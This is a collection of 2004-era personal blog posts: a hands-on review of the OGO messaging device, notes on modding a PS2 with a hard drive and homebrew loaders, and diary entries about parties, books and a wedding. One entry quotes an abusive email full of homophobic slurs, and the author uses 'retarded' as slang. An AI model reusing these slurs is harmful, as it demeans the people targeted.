<p>The OGO is basically a device meant to hit the market of kids who are texting, instant messaging and emailing a lot. the point between a two way and a sidekick. the back of the box says This is Ogo. It does IM, it does e-mail, it does text. All in one. All at once. Any time, any place - in your hand, on the bus, at the beach, at home, at large. You dont need a computer, you dont need a wire. You get the message. Send word. And welcome to the Ogosphere. omg. so that is the gest of it. hah.</p>
<!--more--><a /><a href='http://nata2.info/?path=pictures%2Fmisc%2Fogo_review&img=DSCN2054.jpg'><img src='http://nata2.info/.thumbnails/pictures/misc/ogo_review/DSCN2054.jpg' border='0' align='left' /></a>
<p>So i was contacted to be a tastemaker/tester for the OGO a couple weeks ago and i jumped at the opportunity. I received the box and immediately busted it open. The box is crazy colored and is obviously targetted towards youth (and possibly the sidekick market). it has an interesting pricing structure on the back of the box - 17.95, 1 account; 20.99, 2 account; and 23.99, 3 accounts. i have no idea what this means i can only imagine it has to do with the number of email accounts or aim accounts you associate with the device.</p>

<p>The device is very similar in size when closed to the gen 2 sidekick. and a bit bigger when opened:</p>

<p>Ogo, Yoyojam Hitman</p>
<strong>Thoughts:</strong>
<p>As you can see the Ogo is a competitive size. It is a bit bigger than the sidekick when folded out and a bit thinner when folded up. It is quite a bit bigger than the hitman. The size feels pretty good. it is weighted well so it rests in your hands well. It is pocket sized and the thinness is much more attractive to me (i.e. fits in a jean pocket).</p>
<a href='http://nata2.info/?path=pictures%2Fmisc%2Fogo_review&img=DSCN2040.jpg'><img src='http://nata2.info/.thumbnails/pictures/misc/ogo_review/DSCN2040.jpg' border='0' align='left' /></a>
<p>The screen is very bright and has good resolution. I dont konw the specs but it looks <a href='http://nata2.info/?path=pictures%2Fmisc%2Fogo_review&img=DSCN2044.jpg'>very good</a>. The speaker is loud and clear. The feel of the device is pretty solid. Sometimes i find that i am immediately afraid i will break a device when i get it into my hands. this hasnt even crossed my mind with the ogo. i imagine that i coudl slam it into my back pocket and goto a club without a problem.</p>

<p>I got it to boot up without a problem and noticed right away that the OS is unique looking. It isnt as smooth as the sidekick and really demonstrates how functionally limited the device really is. There are tabs for mailbox, IM, Compose, Contacts, My status, Help, Settings and Device.</p>

<p>The mailbox is simply your email inbox. you can use either a AOL, MSN or yahoo mailbox - or better yet a pop mailbox. This is awesome. it appears(although i am probably mistaken) that the device itself checks the mail - unlike the sidekick which proxied the mail off to T-Mobiles servers. I appreciate this. I suppose i will verify this as my usage continues.</p>

<p>The IM functionality is pretty simple. I was disappointed that it wasnt as clean as the sidekick - although it is pretty dope. The keyboard integrates nicely and is rather usable. i do miss the scroll wheel thing on the sidekick though. One thing that really annoyed me, when entering a password it doesnt astericks out the characters until you are done entering the password. This seems like bad practice. and it makes me mad. haha. ANGRY. umm. so here are some pictures:</p>
<a href='http://nata2.info/?path=pictures%2Fmisc%2Fogo_review&img=DSCN2032.jpg'><img src='http://nata2.info/.thumbnails/pictures/misc/ogo_review/DSCN2032.jpg' border='0' /></a>
<p>AIM Buddy List <a href='http://nata2.info/?path=pictures%2Fmisc%2Fogo_review&img=DSCN2033.jpg'><img src='http://nata2.info/.thumbnails/pictures/misc/ogo_review/DSCN2033.jpg' border='0' /></a></p>

<p>AIM Conversation <a href='http://nata2.info/?path=pictures%2Fmisc%2Fogo_review&img=DSCN2039.jpg'><img src='http://nata2.info/.thumbnails/pictures/misc/ogo_review/DSCN2039.jpg' border='0' /></a></p>

<p>Current Message Dialog</p>

<p>The sms functionality appears to be straight forward. I have yet to introduce the device to my friends. We shall see how it holds up when i am attempting to locate a party and what not. It is responsive and the ui is <a href='http://nata2.info/?path=pictures%2Fmisc%2Fogo_review&img=DSCN2035.jpg'>pretty</a> when receiving a message.</p>

<p>I have yet to be able to use or figure out how to use the PMG. <a href='http://nata2.info/?path=pictures%2Fmisc%2Fogo_review&img=DSCN2056.jpg'><img src='http://nata2.info/.thumbnails/pictures/misc/ogo_review/DSCN2056.jpg' border='0' align='right' /></a> As far as i can tell i am only able to pair it with my phone. I will have to read up on PMG and see what to do. heh. it does have a unique feature - rather than being able to choose if the bluetooth is visible - you can only turn the visibility on for 1 minute. This is both annoying and cool. no bluejacking. heh.</p>
<strong>Gripes:</strong>
<p>The sounds are really annoying. as far as i can tell there isnt a way to truely configure/customize the sounds. This means no ringtone market - no alt sound sets. etc. the default sounds are annoying and ithe level of granularity in the config is pretty bad. for instance, i am unable to say - notify me when a person messages me but that is all, or notify me when someone signs on but doesnt message me. etc. i wish they woudl just replicate the freedom of the AIM client and then roll it into profiles.</p>

<p>The second thing that annoys me is the lack of web browser. would i the that hard to include a web browser. haha. probably. it just seems that it would be handy and fun if it browse the web. a real sidekick killer.</p>

<p>the third is the fact that it uses AIMs mobile buddy list crap. so my buddy list (which is around 200 peeps) is cut off and modified for this device. And the buddy list displays everyone in order whether they are online or not. kinda lame.</p>
<strong>Conclusion</strong>
<p>After using the thing for the afternoon i think i like it. there are some annoyances but over all it seems to be a lean mean chatting machine. (i am a dork) I wouldnt replace my sidekick with it - it doesnt have ssh and all that - but it fits into a very specific niche and seems to do rather well at it. I obviously need to figure out how to send my contacts to it and then figure out how to use PMG. when i do that i think i will like it a lot. It is also kinda big, but small when folded up. I may feel weird when i use it. i will have to see how the trainride home goes. ;) I will be experimenting with the USB port later (so far it just charges).</p>

<p>It feels very anime.</p>

<p>Check out all the pictures i took of it <a href='http://nata2.info/?path=pictures%2Fmisc%2Fogo_review'>here</a>.</p>

                <p>it has been a weird couple days. It all started last wednesday. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A09%3A16_Tommie_Rockroom&img=IMG_1519.jpg'>tommie</a> called me to alert me of his presence and invite me to scissor sisters. that ruled. we hung out then. and then we went to crobar and I broke myself. <br /><br />i hadn&#8217;t been feeling good. so I stayed in bed friday. then went to my final interview around 5ish on friday. I receieved and accepted my offer and happily went to the paper magazine party at marshall fields. we had a lot to drink and <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F200920040149&img=Nokia6600%28554%29.jpg'>played fashion</a> or whatever you <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F200920040149&img=Nokia6600%28556%29.jpg'>play at events</a> like that and decided that since the night was early - we needed some entertainment that was more resturant like. so of course we went to <a href='http://www.tradervics.com/'>trader vics</a>. it was insane. <br /><br />i want to be able to say. &#8220;it was retarded&#8221; - blackeyed peas style. but I don&#8217;t feel that is appropriate. but as anyone who knows me realizes - I am unable to come up with new words on the fly. so I have to think about it. and right now I am thinking about a new word to replace retarded. currently it is insane. but that isn&#8217;t really working in the right way. <br /><br />so anyway. trader vics was <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F200920040149&img=Nokia6600%28560%29.jpg'>retarded</a>. and <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F200920040149&img=Nokia6600%28568%29.jpg'>totally a mess</a>. we drank $200 worth of rum drinks and decided to go to the southside to represent up on some art kids. it didn&#8217;t work so we left and went to sound bar to see perry farrell dj. hah. apparently he is a bad dj. I have no idea. I didn&#8217;t really hear him. <br /><br />i met some girl named tracy. hah. we hung out a bit. weird.<br /><br />i found a disposable camera at sound bar and will be posting pictures from it soon. I am excited to see how they turned out. the night was such a mess that it should be at least a bit entertaining. after soundbar I went to spy bar with tracy.. and then they left and I went back to sound bar. then to jays(?) and then to jordans house. then to home. then to sleep. <br /><br />i woke up saturday dieing of the poisoning I had ingested the nigth before. I need to not do that. stupid free drinks. <br /><br />so saturday I met my friend <a href='http://www.nata2.info/?path=pictures%2Fevents%2F2004%3A09%3A18_Kill_hannah_afterparty&img=IMG_1556.jpg'>danielle</a> and went to the <a href='http://www.nata2.info/?path=pictures%2Fevents%2F2004%3A09%3A18_Kill_hannah_afterparty&img=IMG_1561.jpg'>kill hannah</a> show. it ruled of course. <a href='http://www.nata2.info/?path=pictures%2Fevents%2F2004%3A09%3A18_Kill_hannah_afterparty'>a lot of crazines</a>. then I went home. hah. <br />&lt;bR&gt;sunday I went and saw <a href='http://www.gofishpictures.com/GITS2/'>ghost in the shell 2</a> with elaine. that is a dope movie. I quite enjoyed it. so good. so fitting with what I am interested in right now. <br /><br /> speaking of the darkness that has consumed me for the past couple weeks. I have ran out of things to read. so I made a run to amazon.com and purchased some stuff. I picked up: &lt;blockquote&gt;&lt;small&gt; Restraint of Beasts: The by Mills, Magnus<br /> Underground and Vintage Murakami by MURAKAMI, HARUKI&lt;bR&gt; In a Glass Darkly By: Sheridan Le Fanu&lt;bR&gt; The Woman in the Dunes by ABE, KOBO &lt;bR&gt; Amrita, Asleep, and Kitchen by Yoshimoto, Banana <br /> Haruki Murakami and the Music of Words by Rubin, Jay <br /> A Personal Matter by Kenzaburo O?<br /> &lt;/small&gt;&lt;/blockquote&gt; I am excited. I apparently forgot to by earthquake - by murakami - which is sad. but whatever. I will get it later. I love him. I am currently struggling through <a href='http://www.complete-review.com/reviews/japannew/yumiri1.htm'>gold rush</a> by Yu Miri. I don&#8217;t really like it. and it totally makes me upset. so I don&#8217;t think I can read it any longer. I stopped carrying it. it just seems to be filled with horrible gratuitous violence. so annoying. not even a redeeming story. I need more darkness. <br /><br />i started/made/whatever another site. relaly it is just following through with the plan I made a billion years ago. check out <a href='http://www.fukung.net'>fukung.net</a>. it is my new hong kong/horror/foriegn/action/cultish movie review site. and since I started playign with that I also decided to catalog my movies for reals. I got out my fancy <a href='http://cuecatastrophe.com/'>cuecat</a> barcode scanner - got some <a href='http://collectorz.com/movie/'>software</a> that would do all the dirty work for me. and went to town. it took a couple hours. but the results are pretty good. check out my collection <a href='http://dopeman.org/movies/'>here</a>. all 230 movies or whatever. it is amazing to look at them in that perspective. totally crazy. but whatever. <br /><br />i am tired. weird. I have tried not to go out. and I have been pretty successful. last night I avoided it - but missed a friends bday. sad. I shoudl have gone - but was so tired. and am trying to save money. speaking of saving money I got a <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F220920041236&img=Nokia6600%28582%29.jpg'>new wallet</a>. hahaha. <br /><br />i found out today that a lot of people from work read my blog. awesome. hi peoples.</p>

            <div class="PostContent">
                <p>This post is comprised of notes from my wiki. so it is pretty free form. Basically it is just me haxoring my PS2 to be more fancy.</p>

<p>The following pictures and documents are from my attempt at hacking the ps2. i am not really skilled nor am i very innovative.. i think i am just fearless.. especially in regards to breaking my roomates playstation ;)</p>
<!--more-->
<p>basically the goal was to add a hard drive and see what happens. adding a hard drive to the ps2 is really really easy. all you need to do is plug it into the ps2 network adaptor.. which happens to have an IDE plug on it already. NO MODIFICATIONS need to occur. there is even a sleev in the PS2 for the ide drive. i was amazed. i guess that is why the back of the network adaptor says HDD.. hahahaha.</p>

<p>originally i found a hard drive that worked perfectly. however. it was only like 6 gigs. that shit woudl work ever ;) so i found an extra 45g drive(hehe.. i really didnt check what was on it.. prolly ALL of my source code.. backed up :P) and proceded to install it into the bastard playstation.</p>

<p>however the harddrive i picked didnt fit on the network adaptors ide plug. so i got out my tool kit and fixed it. luckily for me i didnt fuck it up too bad. basically i took all the pieces out.. one by one.. and unseated the power and ide plugs(this was a pain in the ass.. cuz they are riveted in). i ten cut the bottom off of the metal shield so the plugs could move around to accompany any size drive. this accomidated my ps2 and hdd well. it worked. i booted up tonyhawk 4 to check if i fried my network card.. and BAM.. it worked.. i rule/am lucky once again.</p>

<p>Next.. i booted(using the GS2 disk) up the HDtool and schooled my hdd. however. it didnt work. tricky HDtool took a lot of work to get going.. but finally i did it.. and formated my drive. as you probably know the tutorial isnt very verbos. it totally ruled.. but there are a lot of options in hddtool that just arnt covered by any tutorials..</p>

<p>so after doing this.. i couldnt wait to boot the BB nav.. so i popped in the disk and wham.. booted right up.. and luckily.. my roommate got home and was willing to help me translate some of the japanese bbnav3.0 text. it is pretty straight forward.. so i followed te directions on the screen.. and the directions in Lazarones tutorial(nice work.. ). however.. it kept failing 3/4s of the way through the 2/2 install part. which obviously sucked. i think i have a fucked up burn of the bbnav 30. stupid .cue files. i attempted to boot anyway using the ps2 RTE bbnav boot (this is awesome btw) and i get a kernel panic. If i now loud the hddtool i do see a bunch more files.. and quite a bit of my drive taken up. so something is happening..</p>

<p>so that is where i am with BBNav. it seems fancy. however.. it doesnt work for me. maybe i will have better luck with 31. ;);)</p>

<p>having failed at installing the full version of BBNav i moved on to some of the easier hacks. i have to say that the independence exploit.. which could have been the easiest install in the world.. is really handy. i like how you just install it however you can.. and then when you boot up the specific ps2 game you specified in your TITLES.DB - wham.. you boot the binary on the card. not that is haxoring for sure.</p>

<p>next i tried out the new send0r disc(fancy fancy). i really like the idea of the send0r disc. it allows you to boot games off of the send0r site. from a security standpoint it is a real mess. but it rules.. when i can boot some fancy demos from raizer.. and really rock out to good demo music. nothing is better than demo music btw.. (i love my mindcandy)</p>

<p>so i played with sendor and finally played the homebrew game. black adder rules..</p>

<p>that is the basic story. it really wasnt too bad. you dont need a modchip.. or break your warrenty.. i did.. but i didnt have too.. it was mainly that i didnt have patience to find an HD that actually fit.</p>

<p>love <a href='http://nata2.info/misc/misc_hacking/ps2/hacking_ps2%20026.avi'>nata2 </a> if you have questions.. i am xygoat on efnet. I rule the school.. or is it the tool.. nobody knows. thanks to the guys at ps2ownz.com.. without your gentle ribbing.. i would have never sat down and rtfm. also send0r and prevch is awsome. say hi to all of your mothers..</p>

<p>i am a fancy man. fancy fancy fancy man. i am a fancy man.</p>

                <p>seriously. I was just sitting here at home waiting for things to happen. and BAM something happened. I got an email from minmouse@sbcglobal.net. heh. rule. here it is: <blockquote><small>
Hey Faggot,<br />
 At least I'll wake up who I am tomorrow..... But Nata's RETARD, well he will still be RETARDED in the am. You faggot will still wake up a faggot in the morning.
</small></blockquote> I am apparently am going to wake up someone who I am not tomorrow - if I compare myself to that guy. hmm. weird. anyway. as john says: <blockquote><small>
<b>John E Toughguy:</b> Life is good when your only enemies have trouble putting actual sentences together. It makes things easier.</small></blockquote><br /><br />yes I did break nata2.info. but hopefully things will come back together very very soon. I am migrating all my sites from the old server to the new server. it is hard. I was using apache 2.0 but then I read about the problems with threadsafe applications using not threadsafe plugins and extensions. so apache and php(both threadsafe) may work fine - but gd or freetype may destroy life. so I downgraded apaches and upgraded phps. not hp 5 yet. but at least the newest version. so anyway. check out <a href='http://nata2.info'>nata2.info</a> in a bit and hopefully it will work. I lov emy DESTROYER way of upgrading. it rules. RULES. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

<p>i need to restructure everything and it will be the same.</p>

                <p>i really want to go dancing - big band style. all of a sudden. or just watch triplets of belleville. something. just not be up or at work. I am tired of wearing &#8220;business casual&#8221; clothing. I really want to just wear jeans. or whatever. just something that isn&#8217;t &#8221;<a href='http://www.businesscasualdress.com/illustration.jpg'>business casual</a>.&#8221; I suppose I will get over it. ;) I go through these feelings once every couple months and I usually get over it. I do like dressing up. I just hate being constrained with what I wear. I guess if I had client interaction(or clients) I would be more interested in dressing up. but I sit in a cubicle and listen to death metal. so wtf. <br /><br />this weekend ruled. on friday I didn&#8217;t do anything. watched a crazy hong kong movie called <a href='http://www.rottentomatoes.com/m/we_are_going_to_eat_you/'>we are going to eat you</a> and then played some of my new favorite <a href='http://www.zelda.com/fourswords/launch/'>video game</a>. I am goign to beat/solve it in the next week. I decided. I am pretty far. I haven&#8217;t played a video game this much since kings quest 6. or the orginal gta. or doom. or quake 1,3,2. or doom 3. wait a sec. heh. I gotta go. <br /><br />so I got up midday saturday. and hung out. then went to my friend <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/130920040005/Nokia6600(518).jpg'>genies bday party</a>. it was pretty fun.

                <p>So this weekend was pretty cool. I am reading another good japanese book. I have no idea why I am reading all the japanese dark ficiton I can get my hands on. I am currently reading <a href='http://www.amazon.com/exec/obidos/tg/detail/-/0802139914/qid=1094592192/sr=1-2/ref=sr_1_2/104-5041001-6746318?v=glance&amp;s=books'>Goodbye Tsugumi</a>. it is pretty bleak. I like it. next I got like 3 murakami books waiting. hah. I am a dork. I like shotgun reading. it totally suits me. <br /><br />after I read a bit and wrapped up my unpacking - I watched <a href='http://imdb.com/title/tt0327056/'>mystic river</a> - which I stole from my parents (i promise I will send them back soon :P). It was pretty good. <br /><br />at some ppoint in the last couple days I redid the HTML on <a href='http://www.nata2.info'>nata2.info</a>. it is a bit better now. no more tables. although tables are not bad. I really enjoy divs much more. <br /><br />so this weekend. it all started on wednesday. heh. I <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/060920042246/Nokia6600(439).jpg'>flew to denver</a> and went to greeley. where I hung out with my family and married my brother.<br /> haha<br />saw him married I guess.. <br />anyway. so wednesday night jon and I went to the dugout and drank beers. it was fun. but we had drank too much to drive home and I didn&#8217;t have a license. so we <a href='http://nata2.info/.thumbnails/pictures/misc/phone_camera/nokia_6600/060920042246/Nokia6600(447).jpg'>walked home</a>. it was pretty <a href='http://nata2.info/.thumbnails/pictures/misc/phone_camera/nokia_6600/060920042246/Nokia6600(449).jpg'>funny</a>. we were picked up by this nice guy who dropped us off near my house. the next day we all got up early. I went and renewed my license. and ran some errands/got reservations for my bros little <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A09%3A02_dylans_bacherlor_party'>bachelor get together</a>. <br /><br />dylan really wanted to go to dave and busters - so <a href='http://nata2.info/.thumbnails/pictures/events/2004%3A09%3A02_dylans_bacherlor_party/IMG_1283.jpg'>we</a> all piled into this <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A09%3A02_dylans_bacherlor_party&img=IMG_1284.jpg'>bus</a> and drove to dave and busters in westminister. We drank a bunch of <a href='http://nata2.info/.thumbnails/pictures/events/2004%3A09%3A02_dylans_bacherlor_party/IMG_1291.jpg'>champagne</a> and quite a few mixed drinks and beers. we had purchased a bunch of liquor in an attempt to get dylan to drink a lot. haha. we got some deserno for deserno and coke. and then some redbull and ketel one. yea know.. the usual. there was a really <a href='http://www.bevnet.com/reviews/dickenscider/'>funny cider we got</a> as well. so then we arrived - had a big dinner. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A09%3A02_dylans_bacherlor_party&img=IMG_1305.jpg'>dylan and jon</a> did this disgusting shot with 151, jager, midori and some others. it was nasty. but it <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A09%3A02_dylans_bacherlor_party&img=IMG_1304.jpg'>looked cool</a>. we were all tired - so we went home after that. <br /><br />on friday. we hung out and ran errands again. then there was the <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/060920042233/Nokia6600(458).jpg'>rehersal</a>. and a bunch of <a href='http://nata2.info/.thumbnails/pictures/misc/phone_camera/nokia_6600/060920042233/Nokia6600(457).jpg'>face</a> <a href='http://nata2.info/.thumbnails/pictures/misc/phone_camera/nokia_6600/060920042233/Nokia6600(456).jpg'>making</a>. it was <a href='http://nata2.info/.thumbnails/pictures/misc/phone_camera/nokia_6600/060920042239/Nokia6600(455).jpg'>pretty awesome</a>. then we had a big dinner for everyone and just generally hung out. after the dinner we went to walmart to buy supplies for the wedding and found the magical and exciting silly string. it ruled. we then <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A09%3A04_dylans_wedding&img=IMG_1320.jpg'>attacked my dad</a>. it was very funny. <br /><br />then saturday happened.

                <p>so today - I am chilling - taking a shower and my wall attacked me. I was just brushing my teeth in the shower and I turned around and the wall that was facing my back <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/010920040921/Nokia6600(430).jpg'>lost</a> all the <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/010920040921/Nokia6600(429).jpg'>tiles</a>. It was nuts. I about died. I couldn&#8217;t possibly imagine what had happened. honestly scared the hell out of me. I really love being scared. <br /><br />i leave for greality today. my brother is getting married on saturday. I am pretty excited. I hope to renew my license. then unrenew it. then get n illinois license. I suppose it is a good plan after a couple years. but whatever. <br /><br />last night I went with <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/010920040017/Nokia6600(424).jpg'>hirom</a> and <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/010920040017/Nokia6600(425).jpg'>valentina</a> to an excellent <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/010920040017/Nokia6600(423).jpg'>korean</a> <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/010920040017/Nokia6600(422).jpg'>bbq</a> <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/010920040017/Nokia6600(426).jpg'>place</a>. it was so good. &lt;3. after dinner we went to this nice lounge called <a href='http://metromix.chicagotribune.com/search/43598,0,1932950.venue'>orange</a>. we had some fresh pinapple soju. it was so good. then we stopped by juggling club. then I packed. and set up my laptop for doing development on the plane. haha. I love that when I travel I am like.. &#8220;hmm what shoudl I do - watch a dvd or write software?&#8221; - I am totally not a nerd. <br /><br />i kind of want to sleep.</p>

                <p>haha. <br /><br />so this weekend was pretty ridiculous. it was generally out of control. basically I just hung out and did the things that make my life incredible. haha. it all started on Wednesday (of course). <br /><br /> so for the past couple weeks I have been working nights a lot. so I have also had a LOT of screwed up sleep - i.e. none. especially at night. soo&#8230; on Wednesday I was struggling with attempting to not stay up all night - so I hung out at home and though about sleeping. at around 12 I went over to this bar called elm street liquors and hung out with some friends who spin there. it was pretty dope - it isn&#8217;t the coolest bar, but it is not so bad. we then went to vips and hung out at the strip club. haha. I have gone to a strip club more in the last month than I have ever wanted to. like 4 times. hah. and I keep going. it is weird. just a place to go I guess. so we closed vips.

                <p>today was pretty fun. I worked. wore a tie. etc etc. it was nifty. and now I am really pretty tired. I need to get off of this crazy crazy schedule. I really dispise and hate it. <br /><br />i picked up an airport express. it is relly pretty cool. I like what I am abl eto do with it. especially the streaming of music. that is really really cool. I can&#8217;t really think of anything cooler. I have it hooked up to my stereo right now. I am about to play some songs for the night and then goto sleep.<br /><br />but I only wish for that to happen.<br /><br />i have a secret. secret secret secret. it isn&#8217;t a good one. it is kinda hard to deal with. ok ok. I have four arms. no wait. my secret is out. umm. anyway. I need to figure everything out. it feels like it is right. or wrong. but I don&#8217;t know. I am so confused. haha.</p>

                <p>so my friend from work, lakshmi, is leaving on monday to go back to india. it is kinda sad. she is one of my favorite coworkers. I really didn&#8217;t realize it was truely happening until I read her <a href='http://lakshvivek.blogspot.com/2004/08/wonderful-journey-continues.html'>entry</a> about work and the disengagement from sait work. apparently I swear. but it is kinda weird to think about. because it is so different from another coworker leaving or a friend moving - because she is going to india. to visit is a lot more of an effort (and a lot cooler). I guess I have to witness(as I have before) the miracle of the internet. haha. <br /><br />in the past yea lakshmi has sat behind me and put up with my craziness - my torrets, my crabbiness on days I don&#8217;t get sleep and my general awesomeness (haha). she has given me good advice (that I rarely follow - cuz I am dumb) and suggested things to me that only good friends say. she has really been a great friend. it is always sad to have them leave. friends that is. always leaving. but I am not scared of losing touch. I am sad about not being able to stand up and turn around and swear a bunch and have her look at me like I am crazy and both of us laugh. or have her tell me I need to meet girls - and to stop making websites (maybe they are connected). and all that. but I imagine our relationship will evolve into something different. I will probably read her blog a bit more (unless she keeps changing the location - seriously wtf) and I imagien I will be talking on AIM a bit more. so those things won&#8217;t change. but still. proximity is good. I guess I will have to go back to india. <br /><br />goodbyes are dumb.</p>

                <p>it doesn&#8217;t work. having a crazy scedule where you are up from 11 to 6 and sleep from 6 to 9 and then are up from 9 until 6 is insane. it creates ghosts in my head. I was hanging out at work yesterday morning - about 24hrs ago - and I thought I heard voices calling my name. I scurried off home. full of fear of zombies and demons. it ruled. I even took a cab. cuz I didn&#8217;t trust the train. place is full of zombies. <br /><br />there is almost no way in hell I am going to arrive at work tomorrow on time. but wtf. they did this to me. I mean. I tried to sleep. hahaha. but I keep wakign up at like 11 raring to go.<br /><br />so I just read Haruki Murakami&#8217;s &#8220;Norwegian Wood.&#8221; it is so good. I quite like Murakami. his writing so very haunting. it reminds me of real life sometimes. or how I picture real life to be. if it were real. real life that is. all of his characters seem to have a dark cloud hovering above them at all times. something deep and brooding. it makes the characters seem more real than most novels that I read. well that may be alive. I love having feelings while reading a book. in the past six months it has happened three times - the first was in &#8220;the world accoding to garp&#8221; when garp&#8217;s son dies. that was sad. and how john irving used what we didn&#8217;t know to tell us was beautiful. it was really incredible how it worked out. but it was also so horrifying. I love being in a situation were I have to put down the book and think about it. as if I was actually involved. the book is an involvamatron. the next time was in anna karenina when levin and kitty got together. at the time my feeling was very strong - I could explain it to anyone - but now I am forgetting. it was great though. I think it was the theme. actually that whole book was incredible. I remember my friend <a href='http://thom.watership.org/'>thom</a> mentioning that I should read it cuz it was his dads favorite. or something. I was like &#8220;i should.&#8221; and I did. it is one of my favorites I think as well. <br /><br />so then the next time I was &#8220;moved&#8221; by a book was in norwegion wood - when watanabe is sad about naoko and he accidently ignores midori and hurts her - the letter that midori writes him is so sad. it really made me think for a bit. <br /><br />sometimes though feelings are stupid. haha. <br /><br />i just got a email from asstraffic. I imagine it is full of surprises and exciting offers for enlarging things. stupid things. <br /><br />i need to read the great gatsby. someone <a href='http://tinyurl.com/5a3hl'>buy it for me</a>. ok. thanks.<br /><br />i have been listening to mastodon. it is really good. I like it quite a but. my vocabulary sucks. I want to go on a date. I am tired. <br /><br />heh. if you haven&#8217;t visited <a href='http://thom.watership.org/'>thom's webpage</a> you should his pictures are incredible. it makes me sad that I am not dong what he is doing. I miss the mountains and the nature and the whales. wtf. right. <br /><br />i obviously shouldn&#8217;t write entries at 4:30 in the morning after reading a dark dark book. <br /><br />i think one of my favorite things is reading a whole book in one sitting. I love abondoning things and doing something completely not related and just engaging 110%. it makes me feel so good. it could be my favorite thing. not abandoning things - but reading books. favorite above all. <br /><br />oh yea. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A08%3A19_lakshmis_going_away_party'>here</a> are some pictures from work today. and after work I went to hard rock for a beer and saw gary colemon. wtf indeed. <a href='http://operationhammertime.org/'>this is funny</a> and <a href='http://zed.cbc.ca/go.ZeD?CONTENT_ID=2365&mediaSize=double&page=media-viewer'>this</a> is awesome.</p>

                <p>Today is weird. I worked from 9 to 5 twice in 24 hours. That is a lot of work. I am totally of the school of thought that you should always pace yourself. 16 hours with a 3 hour break isn&#8217;t really pacing myself. But whatever - it is the same sxhedule I sometimes have with going out and work - and I don&#8217;t complain then. Heh.<br /><br /></p>

<p>Today I got a letter from my friend ella from taiwan. It was exciting. I took some pictures of what she sent me. I will possibly explain later.<br /><br /></p>

<p>The more stressful work is for me the less I blog. Stupid work.<br /><br /></p>

<p>Today I installed sp2 - bluescreened 5 times - uninstalled it - bluescreened 5 more times for no reason. Hate.<br /><br /></p>

<p>Wtf did microsoft do to make itself incompatible with its own transparency api deal. Hahah. Ny vocab is awesome.<br /><br /></p>

<p>I am writing this entry on the train. My thumbs hurt. I wish I could just think entries. But if I could - yall wouldn&#8217;t read this - cuz it would be LONG and weird. I would talk about my demon bunny dreams and my conversations about robot ranches - which would naturally lead to the discussion about the asimov short story where cars killed humans.<br /><br /></p>

<p>I rode my bike a bunch on sunday. I rode to cole and melissa&#8217;s house for a bbq. Theb to the metro for fear factory. Then home. All in all about 1 billion miles. I was tired.<br /><br /></p>

<p>I sa garden state on sunday night. I don&#8217;t know about it. It totally reminded me how I don&#8217;t have a gf. It was awesome. I was like &#8220;sweet I am lonely and hollywood knows it.&#8221; Stupid stupid hollywood. Btw I am totally not lonely. I am such a MAN.<br /><br /></p>

<p>Almost home.<br /><br /></p>

<p>Almost in bed.<br /><br /></p>

<p>Today Is gunna be so weird.<br /><br /></p>

<p>I think my life is either about to come together or explode.<br /><br /></p>

<p>I hope either one is a big mess.<br /><br /> btw. it is a beautiful day out.</p>

<p>i am maybe drunk. it sucks. cuz I have to work. I thought I didn&#8217;t have to work. and now I do. I am not real drunk. but a little. LAME. stupid sake. ;) <br /><br /></p>

<p>i am in trouble. so much trouble. I need to figure out what is happening. figure out and make a couple decisions. I am scared and yet also happy. I could be sad. but I am not.<br /><br /></p>

                <p>last night was entertaining. I was planning on working at 12 - but then I call my coworker and she was like &#8220;oh no - you don&#8217;t have to work&#8221; - so I went out. then when I got home. india called and was like - &#8220;everything isn&#8217;t working how it is supposed to work&#8221; so I had to do a bunch of stuff until around 3:30. heh. then I slept until 10. it was nice. but doing this kills my sleep abilities. <br /><br />so last night - I went to dinner with hiromi at sushi wabi. it was awesome. hiromi is now friends with everyone - so I get to be friends too. and we had super fancy fancy sushi. special rolls. heh. it ruled. but before I went to dinner I attempted to make my computer work better with doom3. and now when I turn it on it beeps. I obviously broke it when I turned on the fast agp writes. hah. maybe something doesn&#8217;t support it. hah. but I am going to take it apart tonight and short the bios. stupid bios. always causing problems. <br /><br />so as cool as doom3 is - it constantly crashes. it is really annoying. matiss got it to work on his computer - which makes me sad. <br /><br />i am going run around now (this is not what I was going to type but I forgot) oh yea. I am going to redo nata2.com</p>

                <p>this weekend I &lt;A href=&#8221;http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&#8221;&gt;went to colorado to see my friend sarah get married&lt;/a&gt;. it was pretty fun. I really enjoy weddings even though they are so weird. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&amp;img=IMG_0969.jpg'>sara h and matt</a> were really cute. it was nice that they got married.</p>

